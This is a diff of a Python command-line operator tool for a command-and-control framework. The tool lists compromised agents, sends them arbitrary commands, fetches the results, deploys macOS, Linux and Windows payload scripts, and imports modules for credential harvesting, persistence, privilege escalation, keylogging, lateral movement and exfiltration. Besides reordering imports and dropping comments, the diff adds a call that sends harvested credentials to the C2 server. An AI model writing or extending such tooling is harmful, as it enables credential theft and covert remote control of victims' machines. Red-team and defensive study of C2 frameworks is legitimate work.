@@ -20,13 +20,13 @@ import time
 # Add modules directory to sys.path
 sys.path.append(os.path.join(os.path.dirname(__file__), 'modules'))
 
-import credential_harvesting
-import persistence
-import privilege_escalation
-import reconnaissance
+import credential_harvesting as credential_harvesting
 import exfiltration
 import keylogging
 import lateral_movement
+import persistence
+import privilege_escalation
+import reconnaissance
 
 cli = typer.Typer()
 
@@ -42,7 +42,7 @@ def list_agents_cli():
     """List all registered agents."""
     try:
         response = requests.get(f"{C2_URL}/list_agents")
-        response.raise_for_status()  # Raise an error for bad status codes
+        response.raise_for_status()  
         agents = response.json().get("agents", [])
         if agents:
             typer.echo("Registered Agents:")
@@ -61,9 +61,9 @@ def send_command(agent_id: str, command: str):
     }
     try:
         response = requests.post(f"{C2_URL}/sendcommand", json=payload)
-        response.raise_for_status()  # Raise an error for bad status codes
+        response.raise_for_status()  
         typer.echo(f"Command sent to agent {agent_id}.")
-        time.sleep(30)  # Wait for the agent to process the command
+        time.sleep(30)  
         fetch_result(agent_id)
     except requests.RequestException as e:
         typer.echo(f"Failed to send command: {e}")
@@ -79,6 +79,7 @@ def harvest_credentials():
     typer.echo("Credentials harvested:")
     for cred in credentials:
         pretty_print_json(cred)
+    credential_harvesting.send_to_c2_server(credentials)
 
 @cli.command("establish-persistence")
 def establish_persistence():
@@ -119,13 +120,10 @@ def deploy_payload(agent_type: str):
     payload_dir = os.path.join(project_root, "../payloads")
     
     if agent_type == "macos":
-        # Execute macOS payload
         subprocess.run([os.path.join(payload_dir, "macos_payload.sh")])
     elif agent_type == "linux":
-        # Execute Linux payload
         subprocess.run([os.path.join(payload_dir, "linux_payload.sh")])
     elif agent_type == "windows":
-        # Execute Windows payload
         subprocess.run(["powershell.exe", os.path.join(payload_dir, "windows_payload.ps1")])
     else:
         typer.echo("Unknown agent type. Please specify 'macos', 'linux', or 'windows'.")
@@ -149,18 +147,17 @@ def select_agent(agent: Optional[str] = typer.Argument(None, help="The ID of the
         if command.lower() == "exit":
             break
         response = requests.post(f"{C2_URL}/sendcommand", json={"AgentID": agent_id, "Command": command})
-        response.raise_for_status()  # Raise an error for bad status codes
+        response.raise_for_status()  
         typer.echo(f"Command '{command}' sent to agent {agent_id}")
 
-        # Fetch the result of the command
-        time.sleep(30)  # Wait for the agent to process the command
+        time.sleep(30)  
         fetch_result(agent_id)
 
 def fetch_result(agent_id: str):
     """Fetch the result of a command from the agent."""
     try:
         response = requests.get(f"{C2_URL}/result", params={"agent_id": agent_id})
-        response.raise_for_status()  # Raise an error for bad status codes
+        response.raise_for_status()  
         result = response.json().get("Result", "No result available")
         typer.echo(f"Result from agent {agent_id}:")
         pretty_print_json(result)
